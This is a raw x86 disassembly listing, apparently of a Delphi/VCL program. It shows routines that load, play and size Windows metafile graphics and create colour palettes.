lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_41f838
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f79c
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f0c
retn
add esp 0xfffffff0
call sub_4034bc
sub_41f838
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_41f8bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax 0x10
call sub_404c90
mov esi eax
mov ebx esi
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_407d5c
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x4 ]
call sub_403f3c
mov eax [ ebp + 0x8 ]
mov [ ebx ] eax
lea eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_403f3c
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov edx esi
mov eax edi
call sub_413eec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f8c2
lea eax [ ebp - 0xc ]
call sub_403ee8
retn
sub_41f8cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp - 0x4 ]
call sub_404398
xor eax eax
push ebp
push sub_41f953
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407d5c
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_403f80
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor ebx ebx
mov edx ebx
mov eax edi
call sub_414098
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4042f4
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov ebx [ esi ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f95a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f0c
retn
sub_41f964
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_41f9e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_414098
mov esi [ eax ]
lea edx [ ebp - 0x108 ]
mov eax esi
call sub_4030e8
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_40414c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4042f4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f9e9
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41f9f4
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x10 ] ebx
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41fb73
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_403ee8
mov eax [ ebp + 0x8 ]
call sub_403ee8
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
cmp [ ebp - 0xc ] 0x1
jle r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_414098
mov ebx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_4033c4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fb7a
lea eax [ ebp - 0x3c ]
call sub_403ee8
lea eax [ ebp - 0x10 ]
call sub_403ee8
retn
push 0x2
lea edx [ ebp - 0x3c ]
mov eax [ rw-data ]
call sub_405af8
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xb
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x28 ]
mov eax edi
mov edx r-xdata
call sub_408db4
dec esi
cmp esi 0xffffffff
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
mov ebx eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_4041b0
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_4041b0
mov eax [ ebp + 0x8 ]
push 0x2
mov eax [ edi ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x28 ]
mov eax edi
mov edx r-xdata
call sub_408db4
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
lea ecx [ ebp - 0x38 ]
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_408db4
inc [ ebp - 0xc ]
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0xc ]
call sub_40836c
mov edx [ ebp - 0x10 ]
lea eax [ ebx + 0x8 ]
call sub_403f3c
sub_41fc40
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ esi + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ esi + 0x8 ] eax
mov ecx [ r-xdata ]
mov dx 0x3
mov eax esi
call sub_41fcec
mov ecx [ r-xdata ]
mov dx 0xe
mov eax esi
call sub_41fcec
mov ecx [ r-xdata ]
mov dx 0x2
mov eax esi
call sub_41fcec
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_41fcc0
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403198
mov eax [ esi + 0x8 ]
call sub_403198
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_41fcec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ecx
call sub_413eec
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41fd30
push [ fs : eax ]
mov [ fs : eax ] esp
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_413eec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41fd94
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403168
call sub_41fd54
call sub_41fd74
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_41fdd4
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403198
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414628
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_41fe04
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4030e0
mov edx eax
mov eax [ ebx + 0xc ]
call sub_403324
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414738
pop esi
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub_41fe38
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax esi
mov edx edi
call sub_403324
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403198
xor eax eax
mov [ ebx + 0xc ] eax
mov dl 0x1
mov eax edi
call [ eax + 0x48 ]
mov esi eax
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_4033ac
mov [ esi + 0x10 ] eax
mov [ esi + 0x1c ] ebx
mov eax ebx
mov dx 0xfffc
call sub_4033ac
mov [ esi + 0x18 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403394
sub_41feb4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
xor eax eax
push ebp
push sub_41ff44
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
call sub_403198
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403394
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_4030e0
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_4033ac
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4033ac
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41ff64
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_420088
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4085cc
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_404448
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41f8cc
test eax eax
jne r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_420027
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4033ac
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_403924
mov eax [ ebx + 0xc ]
call sub_403198
mov esi [ ebp - 0x8 ]
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_4033ac
mov [ esi + 0x10 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403394
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42008f
lea eax [ ebp - 0x14 ]
call sub_403ee8
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_4200c8
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
xor edx edx
mov eax esi
call sub_41feb4
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx [ ebx + 0xc ]
mov eax esi
call sub_41feb4
jmp r-xdata
mov edx ebx
mov eax esi
call sub_414654
mov edx ebx
mov eax esi
call sub_41feb4
jmp r-xdata
pop esi
pop ebx
retn
sub_420124
push ebx
mov ebx eax
cmp [ ebx + 0x12 ] 0x0
je r-xdata
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_420148
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_420170
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_420277
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x44 ]
mov ecx 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
xor ecx ecx
mov cl [ ebp - 0x44 ]
lea edx [ ebp - 0x43 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x44 ]
call sub_40414c
mov edx [ ebp - 0x48 ]
mov eax [ rw-data ]
call sub_41f964
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
call sub_403198
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4201f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403394
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42027e
lea eax [ ebp - 0x48 ]
call sub_403ee8
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_4033ac
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4033ac
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_4201fe
mov eax [ ebp - 0x4 ]
call sub_403198
call sub_40394c
call sub_4039a0
mov eax [ ebx + 0xc ]
call sub_403198
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403394
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42027e
lea eax [ ebp - 0x48 ]
call sub_403ee8
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_4033ac
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4033ac
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_420288
push ebx
push esi
push edi
add esp 0xfffffec0
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
mov [ esp ] 0x0
lea edx [ esp + 0x40 ]
mov eax [ edi ]
call sub_4030e8
lea edx [ esp + 0x40 ]
mov eax esp
mov cl 0x3f
call sub_402a88
jmp r-xdata
add esp 0x140
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor ecx ecx
mov cl [ esp ]
inc ecx
mov edx esp
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
sub_4202e4
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0xc ] 0x0
setne bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ebx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
cmp eax [ ebx + 0xc ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
sub_420360
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_420170
mov eax [ ebp - 0x8 ]
push eax
push sub_420288
push ebp
call sub_4202e4
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4203dc
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
call sub_41c094
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403188
test bl bl
jle r-xdata
push eax
call DeleteEnhMetaFile
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_42041c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41f2d8
mov [ esi + 0x2c ] 0x1
mov [ esi + 0x21 ] 0x1
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_420464
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_42143c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414628
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_420494
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
test esi esi
je r-xdata
mov edi [ eax + 0x14 ]
call sub_42143c
mov edx esi
mov eax ebx
call sub_414654
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
mov edx [ eax + 0x28 ]
mov [ ebx + 0x28 ] edx
mov al [ eax + 0x2c ]
mov [ ebx + 0x2c ] al
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
call sub_421438
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp edi eax
je r-xdata
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
retn
sub_420528
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov esi eax
xor ebp ebp
test esi esi
je r-xdata
mov eax [ esp ]
push esi
push edi
mov esi eax
lea edi [ esp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
dec [ esp + 0xc ]
dec [ esp + 0x10 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
mov eax edi
call sub_41dd60
push eax
call PlayEnhMetaFile
test esi esi
je r-xdata
push 0xffffffff
push esi
mov eax edi
call sub_41dd60
push eax
call SelectPalette
mov ebp eax
mov eax edi
call sub_41dd60
push eax
call RealizePalette
push 0xffffffff
push ebp
mov eax edi
call sub_41dd60
push eax
call SelectPalette
sub_4205c0
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_420768
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x54 ] 0x64
push eax
mov eax [ esp + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x20 ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_420624
push ebx
push esi
push edi
add esp 0xfffffbfc
mov ebx eax
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax edi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x14 ]
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov esi eax
test esi esi
je r-xdata
cmp esi 0x100
jle r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41c094
mov [ esp ] 0x300
mov [ esp + 0x2 ] si
lea eax [ esp + 0x4 ]
push eax
push esi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov eax esp
push eax
call CreatePalette
mov edx [ ebx + 0x28 ]
mov [ edx + 0x14 ] eax
and esi 0xff
sub_4206b0
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_420768
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x50 ] 0x64
push eax
mov eax [ esp + 0x4c ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_420714
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_420c90
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_415cf0
pop ecx
sub ecx eax
mov edx esi
mov eax ebx
call sub_4208cc
mov edx esi
mov eax ebx
call sub_4207fc
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
retn
sub_420768
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28 ]
call sub_42143c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov esi eax
mov [ ebx + 0x28 ] esi
mov eax esi
call sub_421438
pop esi
pop ebx
retn
sub_420790
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ esp ] 0x4
jg r-xdata
mov edx esi
mov eax ebx
call sub_420c90
test al al
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ esp ]
sub ecx 0x4
mov edx esi
mov eax ebx
call sub_4208cc
mov edx esi
mov eax ebx
call sub_4207fc
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edx
pop edi
pop esi
pop ebx
retn
sub_4207fc
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_420768
lea edx [ ebp - 0x68 ]
mov ecx 0x64
mov eax edi
call sub_415f1c
cmp [ ebp - 0x40 ] 0x464d4520
je r-xdata
mov eax [ ebp - 0x38 ]
call sub_4026dc
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_4208bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x68 ]
mov ecx 0x64
call sub_4028d8
mov ecx [ ebp - 0x38 ]
sub ecx 0x64
mov edx [ ebp - 0x4 ]
add edx 0x64
mov eax edi
call sub_415f1c
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
call SetEnhMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_41e050
mov [ ebx + 0x18 ] 0x0
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x50 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ ebx + 0x10 ] eax
mov [ esi + 0x2c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4208c3
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_4026fc
retn
call sub_41e050
sub_4208cc
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_420768
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x22 ] 0x9ac6cdd7
jne r-xdata
call sub_41e050
lea eax [ ebp - 0x22 ]
call sub_41eea0
cmp ax [ ebp - 0xe ]
je r-xdata
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x18 ]
movsx edx [ ebp - 0x1c ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0xc ] eax
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x16 ]
movsx edx [ ebp - 0x1a ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0x10 ] eax
mov [ ebp - 0x32 ] 0x8
xor eax eax
mov [ ebp - 0x2e ] eax
xor eax eax
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
mov [ ebp - 0x14 ] 0x60
sub [ ebp - 0x8 ] 0x16
mov eax [ ebp - 0x8 ]
call sub_4026dc
mov [ ebp - 0xc ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_420a3b
push [ fs : eax ]
